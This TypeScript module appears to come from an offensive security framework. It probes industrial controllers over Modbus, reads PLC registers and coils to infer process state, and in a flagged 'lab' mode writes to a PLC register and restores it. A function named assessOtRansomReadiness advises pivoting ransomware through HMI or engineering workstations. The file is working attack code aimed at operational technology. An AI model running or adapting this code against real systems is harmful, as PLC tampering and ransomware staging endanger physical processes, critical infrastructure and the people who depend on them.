/**
 * @module ics_impact_proof
 * OT-safe impact proof with semantic PLC/process interpretation.
 */
import { readModbusHoldingRegisters, readModbusCoils, writeModbusRegister } from "./iot_scada.ts"
import { buildSemanticProcessState } from "./ics_semantics.ts"
import { resolveLiveMode } from "./exec_options.ts"
import type { ImpactProof } from "./impact_engine.ts"

export interface IcsImpactProof {
  host: string
  protocol: string
  proofType: "REGISTER_READ" | "REGISTER_WRITE_LAB" | "PROCESS_STATE_OBSERVED" | "SEMANTIC_PROCESS_IMPACT"
  registersBefore?: number[]
  registersAfter?: number[]
  semantic?: ReturnType<typeof buildSemanticProcessState>
  safetyNote: string
  success: boolean
  dryRun: boolean
  mitre: string
  restoreFailed?: boolean
  restoreVerified?: boolean
}

export function icsImpactToEngineProof(vulnId: string, ics: IcsImpactProof): ImpactProof | null {
  if (!ics.success) return null
  const snippet = ics.semantic?.impactNarrative ?? ics.safetyNote
  return {
    vulnId,
    level: ics.semantic?.safetyInterlocks.length ? "L4_CONTROLLED_IMPACT" : "L3_VALIDATION",
    proofType: ics.semantic?.safetyInterlocks.length
      ? "PRIVILEGE_BOUNDARY_CROSS"
      : "HEADER_INDICATOR_REPRODUCED",
    evidenceSnippet: snippet.slice(0, 200),
    timestamp: new Date().toISOString(),
    safeProofMarker: ics.proofType === "SEMANTIC_PROCESS_IMPACT"
      ? "PROOF_ICS_SEMANTIC_STATE"
      : "PROOF_ICS_REGISTER_READ",
  }
}

/** Pure evaluation for lab write + restore — testable without network I/O. */
export function evaluateWriteLabResult(opts: {
  writeOk: boolean
  restoreOk: boolean
  verifyOk?: boolean
  verifyValue?: number
  original: number
}): Pick<IcsImpactProof, "success" | "restoreFailed" | "restoreVerified" | "safetyNote"> {
  const restoreVerified = opts.restoreOk && opts.verifyOk !== false && opts.verifyValue === opts.original
  const restoreFailed = opts.writeOk && !restoreVerified
  return {
    success: opts.writeOk && restoreVerified,
    restoreFailed,
    restoreVerified,
    safetyNote: restoreVerified
      ? "Lab write test with verified restore — OURMINE_OT_WRITE_LAB=1"
      : restoreFailed
        ? "CRITICAL: Lab write succeeded but restore FAILED — verify PLC register state manually"
        : "Lab write failed — no register change confirmed",
  }
}

async function readSemanticRegisters(host: string, port: number): Promise<Array<{ address: number; value: number }>> {
  const regs: Array<{ address: number; value: number }> = []
  const holding = await readModbusHoldingRegisters(host, port, 1, 0, 4, true)
  if (holding.success && holding.data) {
    holding.data.forEach((v, i) => regs.push({ address: i, value: v }))
  }
  for (const addr of [100, 101, 102, 200, 201]) {
    const coils = await readModbusCoils(host, port, 1, addr, 1, true)
    if (coils.success && coils.data?.[0] !== undefined) {
      regs.push({ address: addr, value: coils.data[0] })
    }
  }
  return regs
}

export async function proveIcsImpact(opts: {
  host: string
  port?: number
  address?: number
  live?: boolean
  allowWrite?: boolean
  vulnId?: string
}): Promise<IcsImpactProof> {
  const live = opts.live ?? resolveLiveMode()
  const host = opts.host
  const port = opts.port ?? 502
  const address = opts.address ?? 0
  const writeLab = process.env.OURMINE_OT_WRITE_LAB === "1" && opts.allowWrite === true

  if (!live) {
    return {
      host,
      protocol: "modbus",
      proofType: "REGISTER_READ",
      safetyNote: "Dry-run — no network I/O. Set live mode for read proof.",
      success: false,
      dryRun: true,
      mitre: "T0827",
    }
  }

  const semanticRegs = await readSemanticRegisters(host, port)
  const semantic = semanticRegs.length
    ? buildSemanticProcessState(host, semanticRegs)
    : undefined

  const before = await readModbusHoldingRegisters(host, port, 1, address, 2, true)
  if (!before.success && !semanticRegs.length) {
    return {
      host,
      protocol: "modbus",
      proofType: "REGISTER_READ",
      registersBefore: before.data,
      safetyNote: "Could not read holding registers — no impact proof possible",
      success: false,
      dryRun: false,
      mitre: "T0827",
    }
  }

  if (writeLab) {
    const original = before.data?.[0] ?? 0
    const canary = original === 0 ? 1 : 0
    const w = await writeModbusRegister(host, address, canary, port, 1, true)
    const after = await readModbusHoldingRegisters(host, port, 1, address, 1, true)
    const restored = await writeModbusRegister(host, address, original, port, 1, true)
    const verify = await readModbusHoldingRegisters(host, port, 1, address, 1, true)
    const lab = evaluateWriteLabResult({
      writeOk: w.success,
      restoreOk: restored.success,
      verifyOk: verify.success,
      verifyValue: verify.data?.[0],
      original,
    })
    return {
      host,
      protocol: "modbus",
      proofType: "REGISTER_WRITE_LAB",
      registersBefore: before.data,
      registersAfter: after.data,
      semantic,
      restoreFailed: lab.restoreFailed,
      restoreVerified: lab.restoreVerified,
      safetyNote: lab.safetyNote,
      success: lab.success,
      dryRun: false,
      mitre: "T0855",
    }
  }

  return {
    host,
    protocol: "modbus",
    proofType: semantic ? "SEMANTIC_PROCESS_IMPACT" : "PROCESS_STATE_OBSERVED",
    registersBefore: before.data,
    semantic,
    safetyNote: semantic?.impactNarrative
      ?? "Read-only proof — process state observable via Modbus (no write)",
    success: true,
    dryRun: false,
    mitre: semantic?.mitre ?? "T0827",
  }
}

export async function assessOtRansomReadiness(host: string, live = false): Promise<{
  host: string
  hmiLikely: boolean
  modbusWritable: boolean
  recommendation: string
  mitre: string
}> {
  const proof = await proveIcsImpact({ host, live })
  return {
    host,
    hmiLikely: proof.success,
    modbusWritable: process.env.OURMINE_OT_WRITE_LAB === "1",
    recommendation: proof.success
      ? "OT process readable — pivot ransomware via HMI/engineering workstation; do NOT encrypt PLC logic registers"
      : "No Modbus read — focus IT perimeter and jump host to OT segment",
    mitre: "T1485",
  }
}

export default { proveIcsImpact, assessOtRansomReadiness, icsImpactToEngineProof, evaluateWriteLabResult }
